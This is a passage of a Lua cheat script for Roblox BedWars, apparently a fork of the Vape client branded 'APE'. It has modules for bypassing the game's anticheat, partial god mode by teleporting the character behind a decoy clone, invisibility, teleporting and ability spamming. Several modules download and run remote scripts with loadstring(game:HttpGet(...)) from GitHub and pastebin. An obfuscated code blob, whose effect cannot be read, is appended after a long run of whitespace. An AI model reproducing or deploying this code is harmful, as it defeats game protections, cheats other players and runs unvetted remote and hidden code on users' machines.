		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 0<bd then bl=1 else be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(((table.create or function(cs,ct)local cu,cv=0 while true do if cu<=1 then if cu==0 then cv={}else for cw=1,cs do cv[cw]=ct;end;end else if cu~=3 then return cv;else break end end cu=cu+1 end end))or tostring)end else if 2==bd then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if bk~=2 then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 4<bk then cx=1 else for bj=0,cv-1 do cw[bj]=bg(bj)end end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 1<bj then da=bh(be(bi,cx,cx+cz-1),36)else cx=cx+1 end end else if bj<=3 then cx=(cx+cz)else if 5>bj then return da else break end end end bj=bj+1 end end else if bk~=8 then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while((cx<#bi)and not(#a~=d))do local a=cy()if cw[a]then ct=cw[a]else ct=cs..be(cs,1,1)end cw[cv]=(cs..be(ct,1,1))cu[(#cu+1)],cs,cv=ct,ct,cv+1 end else if 11>bk then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if 5>bd then bo={}else c={j,o,m,k,w,u,x,q,s,y,i,l,nil,nil,nil};end else if bd<=6 then bp=v else if bd==7 then bq=bp(bo)else br,bs=1,((-2213+(function()local a,b,c,d=0 while true do if a<=1 then if 0<a then d=(function(q)local s=0 while true do if s~=1 then q(q(q))else break end s=s+1 end end)(function(q)local s=0 while true do if s<=2 then if s<=0 then if b>123 then return q end else if s==1 then b=b+1 else c=(((c*333))%11085)end end else if s<=3 then if((c%376)==188 or(c%376)>188)then return q else return q((q(q)and q(q)))end else if 5>s then return q(q(q))else break end end end s=s+1 end end)else b,c=0,1 end else if a>2 then break else return c;end end a=a+1 end end)()))end end end end else if bd<=12 then if bd<=10 then if bd~=10 then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c==0 then d=0 else for q=0,31 do local s=(a%2)local v=(b%2)if not(s~=0)then if(v==1)then b=(b-1)d=(d+2^q)end else a=(a-1)if not(v~=0)then d=d+2^q else b=b-1 end end b=(b/2)a=(a/2)end end else if c>2 then break else return d end end c=c+1 end end end else if bd==11 then bv=function(a,b)local c=0 while true do if c>0 then break else return((a*2^b));end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 0<a then b,c=bu(b,bs),bu(c,bs);else b,c=h(bn,br,(br+2))end else if a<=2 then br=(br+2);else if a>3 then break else return(bv(c,8))+b;end end end a=a+1 end end end end else if bd<=14 then if 13==bd then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 0==c then return p(a/(2^b));else break end c=c+1 end end else if bd~=17 then bz=(2^32-1)else ca=function(a,b)local c=0 while true do if 1>c then return(((((a+b))-bu(a,b)))/2)else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if 19~=bd then cb=bw()else cc=function(a,b)local c=0 while true do if c>0 then break else return bz-ca((bz-a),bz-b)end c=c+1 end end end else if 21~=bd then cd=function(a,b,c)local d=0 while true do if d==0 then if c then local c=((a/(2^((b-1))))%(2^((c-1)-(b-1)+1)))return c-c%1 else local b=(2^(b-1))return((a%(b+b)>=b)and 1)or 0 end else break end d=d+1 end end else ce=bw()end end else if bd<=23 then if bd>22 then cg=function()local a,b=0 while true do if a<=1 then if a<1 then b=bu(h(bn,br,br),cb)else br=br+1;end else if a>2 then break else return b;end end a=a+1 end end else cf=function()local a,b,c,d,p=0 while true do if a<=1 then if a~=1 then b,c,d,p=h(bn,br,br+3)else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=br+4;else if 4~=a then return((bv(p,24)+bv(d,16)+bv(c,8))+b);else break end end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if bd~=26 then ch=((-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));else ci=((-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 while true do if a<=0 then b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 else if 1<a then break else while true do if(b==10 or b<10)then if(b<=4)then if(b<=1)then if not(b==1)then c=40425 else d=236 end else if b<=2 then p=960 else if(4>b)then q=1920 else s=33223 end end end else if(b==7 or b<7)then if(b<=5)then v=2 else if not(7==b)then w=894 else x=201 end end else if(b==8 or b<8)then y=3 else if(b~=10)then be=1330 else bf=5906 end end end end else if(b<15 or b==15)then if(b<12 or b==12)then if(11<b)then bh=665 else bg=617 end else if b<=13 then bi=211 else if not(b~=14)then bj=33389 else bk=787 end end end else if(b<=18)then if b<=16 then bs=1 else if 18>b then bw=0 else by,bz=bw,bs end end else if(b<=19)then ca=(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs==1 then while true do if ct==0 then ce(ce(cc,cc),cc(ce,ce))else break end ct=ct+1 end else break end end cs=cs+1 end end)(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if 1==cs then while true do if(ct==2 or ct<2)then if(ct<=0)then if(by>bi)then local bi=bw while true do bi=(bi+bs)if not(not(bi==bs))then return ce else break end end end else if not(1~=ct)then by=((by+bs))else bz=((((bz-bk))%bj))end end else if(ct<3 or ct==3)then if(bz%be)<bh then local be=bw while true do be=(be+bs)if(be==bs or be<bs)then bz=(bz*bg)%bf else if not(not(be==y))then break else return ce(ce(ce,ce),((cc(ce,ce)and ce(cc,ce))))end end end else local be=bw while true do be=((be+bs))if not(not(be==v))then break else return ce end end end else if(ct<5)then return ce else break end end end ct=(ct+1)end else break end end cs=cs+1 end end,function(be,bf)local bg,bh=0 while true do if bg<=0 then bh=0 else if bg>1 then break else while true do if(bh<2 or bh==2)then if(bh<=0)then if(by>x)then local x=bw while true do x=((x+bs))if not(not(x==v))then break else return bf end end end else if(bh==1)then by=((by+bs))else bz=((bz+w)%s)end end else if(bh<3 or bh==3)then if((((bz%q))>p))then local p=bw while true do p=((p+bs))if((p<bs)or not(p~=bs))then bz=(((bz*d))%c)else if not(not(not(p~=y)))then break else return bf(be(be,(bf and be)),bf(bf,be))end end end else local c=bw while true do c=((c+bs))if(c>bs)then break else return be end end end else if(5~=bh)then return be else break end end end bh=(bh+1)end end end bg=bg+1 end end)else if not(20~=b)then return bz;else break end end end end end b=b+1 end end end a=a+1 end end)()));end end end end else if bd<=31 then if bd<=28 then if 27==bd then cj=(-1671+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc,ce,cs,ct,cu,cv,cw,cx,cy,cz=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if 0==a then b=409 else c=818 end else if 2<a then p=222 else d=28939 end end else if a<=5 then if a>4 then s=38485 else q=389 end else if a<7 then v=1166 else w=583 end end end else if a<=11 then if a<=9 then if 8==a then x=9454 else y=425 end else if 10<a then bf=442 else be=4509 end end else if a<=13 then if 13>a then bg=292 else bh=3 end else if a==14 then bi=1696 else bj=848 end end end end else if a<=23 then if a<=19 then if a<=17 then if 16<a then bs=10108 else bk=579 end else if 18==a then bw=252 else by=908 end end else if a<=21 then if a~=21 then bz=5205 else ca=470 end else if 22<a then ce=1816 else cc=746 end end end else if a<=27 then if a<=25 then if a==24 then cs=18568 else ct=2 end else if 27~=a then cu=1 else cv=421 end end else if a<=29 then if a==28 then cw=0 else cx,cy=cw,cu end else if a<=30 then cz=(function(da,db,dc,dd)local de=0 while true do if 0==de then da(db(dd,dd,dc,dd),dc(db,da,db,dd),dc(dc,db,dc,dc),dd((db and da),dd,dc,dc))else break end de=de+1 end end)(function(da,db,dc,dd)local de=0 while true do if de<=2 then if de<=0 then if(cx>cv)then local cv=cw while true do cv=(cv+cu)if(cv<ct)then return db else break end end end else if de~=2 then cx=(cx+cu)else cy=((cy+cc)%cs)end end else if de<=3 then if(((cy%ce)==by)or((cy%ce))>by)then local by=cw while true do by=(by+cu)if((by==cu or by<cu))then cy=(cy-ca)%bz else if not(not(by==ct))then return db(da(dc,da,da,((db and dc))),dc(db,db,da,((dc and dd))),dc(da,dd,da,dc),(da(dc,((dd and db)),db and dc,da)and da(((dc and dd)),(dc and da),dd,dc)))else break end end end else local by=cw while true do by=by+cu if not(not(by==ct))then break else return da end end end else if de==4 then return db else break end end end de=de+1 end end,function(by,bz,cc,ce)local cs=0 while true do if cs<=2 then if cs<=0 then if(cx>bw)then local bw=cw while true do 